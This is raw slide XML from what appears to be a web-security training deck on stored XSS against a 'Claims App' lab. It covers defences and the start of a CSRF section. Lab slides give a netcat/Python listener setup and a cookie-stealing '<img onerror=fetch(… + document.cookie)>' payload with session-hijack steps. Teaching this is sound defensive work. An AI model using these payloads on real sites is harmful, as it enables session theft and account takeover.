          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="1420412"/>
            <a:ext cx="3448589" cy="5262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Stored XSS Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A pixel art of a green character holding a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6918AAA1-358A-F599-F578-D14B280AB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828640" y="4406898"/>
            <a:ext cx="1474502" cy="1473200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="A white and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A1BC3E45-5616-D7A5-1D63-F65929C51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746" y="1914582"/>
            <a:ext cx="1842220" cy="1842220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="A pixelated cartoon of a cactus sitting on a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E934D1D-C9CE-A4D1-9C22-8F3C252D0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274" y="2263052"/>
            <a:ext cx="1473201" cy="14732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A454BEC-AD93-5B9B-74A4-6CB3F7B6C27C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5234856" y="2374910"/>
            <a:ext cx="1345474" cy="661302"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="67CA9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&lt;/XSS&gt;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D0C31D80-454C-134D-D05F-D078F01CE97F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6702923" y="1925760"/>
            <a:ext cx="5040586" cy="17336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JavaScript reads unprotected session information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Then sends it to an attacker’s server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="28" name="Picture 27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15D85499-85CB-7728-1450-DA73D0B8F5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1367" y="3428999"/>
            <a:ext cx="549874" cy="549874"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="29" name="Picture 28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DC7A541D-C025-58F4-84B4-B479A3F853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686" y="3531065"/>
            <a:ext cx="549874" cy="549874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D775B5-F571-67ED-2030-3AA97D39D076}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:stCxn id="21" idx="2"/>
            <a:endCxn id="9" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="5234856" y="3036212"/>
            <a:ext cx="672737" cy="720590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282E1A-EEB2-03DD-5AC2-3E13F0CB6665}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5198759" y="3978873"/>
            <a:ext cx="4627501" cy="912480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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA7EE8FE-12BC-08A3-5262-9B7C450918C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2957511" y="5004457"/>
            <a:ext cx="5952572" cy="1490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Attacker can now interact with application as if they are logged in as the other user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17C89D21-7A4F-EFDC-5C48-A4158DAC6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40A7F42-E601-B18E-22D7-50C22C469D38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360384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DBAD4-2100-83AD-07A2-A61B5337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043A-8131-C818-CE1A-DBDAC007B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Attacker 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92677-FC12-C25B-1D26-A538F99DB8DB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17F22D-0B20-DCD2-3C17-229A9F37A474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6013A0-FBB3-AC10-021E-BCEFE3ABF57A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B43755-1456-B922-6A87-CA276E14997F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D1DB3D-8A70-E073-1AA7-EB5BC48FB924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91C2FA-4163-47A7-9AE0-4AE5C49D55E6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CB6D03-EDD6-7B6B-8678-C25033216454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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EAE9F604-605F-F64B-0692-43B0ABDEA8CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814637" y="1419158"/>
            <a:ext cx="9258299" cy="5418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During this attack you will need to have a “server” that is listening for connections. There are a few options:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" algn="l">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Webhook.site</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> &gt; copy </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Most Reliable Option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Python</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Requires Python to be installed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="24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python3 –m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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 4444</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" algn="l">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Netcat</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Requires </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> to be installed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="24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nc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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 -l 4444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4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BurpSuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Collaborator (Professional Only)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53C5DF6B-4754-F71E-F324-29D48B5E7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AE5B00C-6334-1FEB-9210-5AC37FC315A7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842468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6165DA-3E94-EF0E-DFEE-B9FACFD8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D837-8EEF-8DB5-0BA8-641E94840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Claims App XSS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7518D3-437C-A34C-5D59-C957D23C41F4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7398C-8C49-77E3-B293-6DBCD6648F75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D52F85-C947-7B3F-0247-7D7DEDDC8541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D8B39D-B91C-172A-4314-3A9FEB456FE6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5C8841-3B28-8F38-8ED9-62973FEA5EB2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0E74F4-1D52-C715-82D7-D8787CF3D1FF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267599-D3E5-C8FF-2C6F-2B5C1DA91DC5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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{908A4E80-5231-DE8E-64D9-FCE21F0869EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814637" y="1419158"/>
            <a:ext cx="9258299" cy="54182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Login as Alice and find place where XSS happens. Test with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&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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img</a:t>
            </a:r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src</a:t>
            </a:r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=x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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onerror</a:t>
            </a:r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=“alert(‘XSS via </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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img</a:t>
            </a:r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 tag’)”/&gt;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Start attacker server to listen for incoming connections</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="808080"/>
              </a:highlight>
              <a:latin typeface="Andale Mono" panose="020B0509000000000004" pitchFamily="49" charset="0"/>
            </a:endParaRP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Submit request with cookie-stealing payload (use fetch)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3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&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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=x </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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onerror</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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=“fetch(… + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="23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)”/&gt;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Open another incognito window and login as admin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Trigger the payload and check the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Netcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> listener for a connection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Replace Alice’s cookie with Admin cookie (Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BurpSuite’s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> Match and Replace rules). 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As Alice, hit refresh to hijack session.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F57C2D1C-DBCC-75E6-F885-A6B5E141D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B1FEA12-0095-4272-4739-AA847DB37BB9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938444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540A9-0508-8A83-BA43-8B94FDB8C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D0B9-2D7B-644A-5549-287992379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Review: Claims App XSS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BDBA1-4FB1-AAEB-A3C1-2E3D8356E719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34D5B-95F4-E501-C8B2-830B9E97E437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6C7310-ACD4-C216-A676-487D0BEB3E39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39DC8-B75D-F090-034B-7B638C69C5FD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31B0F7-65BA-D570-9B55-DC6D225BEB1F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2EE2FC-032E-3C47-616D-9AFDD3CC888D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6DAF70-14AF-B41B-485E-6C3CA8BE113B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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DAAF67D-8D7C-91C7-080E-EBF1E2F73E70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="1419159"/>
            <a:ext cx="4095613" cy="746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Backend Sanitization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3DD3AC-20E8-8D58-5D33-48CF0DBDE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257" y="2035516"/>
            <a:ext cx="8173605" cy="4616452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CA14F02-6D10-452F-1CBB-F7D1D3E74F19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7787233" y="1385866"/>
            <a:ext cx="4095613" cy="746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server.js:220</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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ABABDFBA-2EB7-7D72-11B5-E083D9146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5EC8A7C-6802-F52D-ABD2-C049F9B98921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612088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2FF4B-5759-3EFF-60E5-9D39CBA1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0ECB-3739-0719-3583-8561D56B8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Review: Claims App XSS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7D2D4B-0613-73F3-BAB8-6B83A0871EC9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FFE3B9-0DFC-BEAD-B5D2-409E831C71BB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95E9CD-7C62-A235-8063-AED08872613A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8CE5AF-7E35-482C-C590-C0F240D83C3E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DFA228-65C4-D84D-6120-1222D310BEDA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6068E6-A9CB-AC35-97BF-562A726C52AD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A55C71-5905-F3AA-3FE9-67B1FA0BA9EA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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{92B3B85D-BE7E-7FED-1533-D9CEE9E58C10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="1419159"/>
            <a:ext cx="5114516" cy="746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Frontend Output Encoding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B4B46B-EA75-3A90-6623-5CCA1C8ABB69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7787233" y="1385866"/>
            <a:ext cx="4095613" cy="746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server.js:220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6F089-E598-0B84-6807-6C8E0ACB4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638" y="2132852"/>
            <a:ext cx="8900705" cy="308800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022875D1-C31F-33E0-A63B-9865AE5CE9A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="5352680"/>
            <a:ext cx="8589236" cy="15053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/>
                </a:solidFill>
              </a:rPr>
              <a:t>Avoid using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill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</a:rPr>
              <a:t>If you must, use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: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const </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>cleanHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DOMPurify.sanitize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>rawHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="32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3E94FD1-CC07-4E4B-05D0-3D84EF315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8E8DCE4-34D3-C876-44E7-07351178DA88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480720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8565B-438D-E748-1550-F705F502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87F0-E7CA-083B-2439-473CC5E78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Review: Claims App XSS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001F46-C6A3-B829-EB15-D7639F187006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2409FE-7959-BD27-EE1E-9BD01FC81429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E993DA-1525-F68E-7095-91F3F0EF06F6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8490-732A-3397-C156-962B8DFA3A10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C43F16-EF42-D248-3564-04853003D714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1C42C9-1C51-10D8-7932-35B07C2CAD53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BCE6154-9950-60AF-B97B-AE7AD13122BC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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1C55587-8080-A14D-8307-0400C604ED1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="1419158"/>
            <a:ext cx="8785998" cy="5190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Trust built-in escaping; don’t disable it.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Avoid raw HTML rendering unless absolutely necessary.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Sanitize and validate data on the backend before storing or serving it.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Enforce a strict Content Security Policy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-514350" algn="l">
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Keep frameworks and dependencies updated.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2" descr="A pixel art of a green character&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE8CB350-5D08-BC18-1AF2-54D0C22A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187" y="5384800"/>
            <a:ext cx="1473200" cy="1473200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A pixel art of a green character&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{03312086-2633-167D-D3D8-9D98CD425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11" y="5384800"/>
            <a:ext cx="1473200" cy="1473200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4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5866156-114B-403D-39F1-FD65E66CC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5DB8D16-4D47-4E1E-0F59-85FC2C9CBCFB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265536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55299-B49A-E8DD-6742-4F3F57F91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D2AB-654B-E5D0-70DE-48E6CCEF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D33C5-7D0F-A414-5EC1-F84AFFAC3084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34E173-48B4-81B8-B45A-965A3ACF888D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89AAF9-1D35-6ECE-A37D-686630A3A069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92C9A3-FD9F-3255-1365-A8938EC28E22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778DA0-1903-35C2-FBD8-D5721EC50322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1DA3C0-3D81-E78A-1653-05A75A5A7D34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9662E7-2904-E08C-165C-74E4CD7641C4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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F370CDDD-68B4-4387-E3EF-272CCBA395D1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2814638" y="1419159"/>
            <a:ext cx="9033373" cy="5073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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Relies on browser cookie behavior.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill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</a:rPr>
              <a:t>By default, browsers will send all origin-cookies automatically with any request to that origin.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill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</a:rPr>
              <a:t>Even if the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sending</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> origin is not the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>receiving origin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3AD9FE9C-1E9D-B25F-757C-9273B36B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3B75A8AA-6F93-3CD8-B577-C3EFA481DCDD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1989456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FE1F1-498E-D614-CEA2-2F5DCE5B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8E2E-5A7F-B9C3-5BB9-AB1668FB3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7F748-9545-3878-EDA1-4C5CD761B59E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47A188-C888-3A53-8703-2974095194F1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C5CC0D-2C62-B25A-AF77-70F8E4612262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90D678-617B-537E-35E2-4F86EFF1A3A8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826C95-F8F2-01A7-8EA8-A5778E7101DF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AC53A7-C644-268B-960F-C90E343CC91A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B9B7F9-A003-ED88-85EE-9CAAFBA75BDA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and green web page&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5A12D7C6-5E1A-AA56-916B-4EA3E5D35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38" y="1354183"/>
            <a:ext cx="2074816" cy="2074816"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="A pixelated cartoon of a cactus sitting on a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DD90EE83-A603-B3C2-F993-2C697F9CB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1219201"/>
            <a:ext cx="1473200" cy="1473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CDAFBA18-180D-B9A6-557F-F69A1538271A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9184324" y="1246762"/>
            <a:ext cx="2671764" cy="573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 err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>a.origin.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="36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BC0BA3-5C1A-F6A2-76FB-D811F0928FCE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6374674" y="1955801"/>
            <a:ext cx="3331029" cy="210343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326EAF83-6C9E-FA2E-1CDC-2FB01A637D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2376" y="1704571"/>
            <a:ext cx="1975659" cy="1975659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4D1679FC-7977-7E6C-C5E5-3C98F176049B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="242744">
            <a:off x="7365276" y="1570767"/>
            <a:ext cx="1071470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Login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C2A162-89E0-6304-891A-0E881D2FD4F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6374674" y="2572376"/>
            <a:ext cx="3343049" cy="120024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ubtitle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D731C410-7C8A-60D2-A812-AC3AE4926BDA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="21448141">
            <a:off x="6722421" y="2240677"/>
            <a:ext cx="1959174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Set-Cookie</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="26" name="Picture 25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39C7129B-769D-AC07-5232-3FD66AD889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0867" y="2917914"/>
            <a:ext cx="779416" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
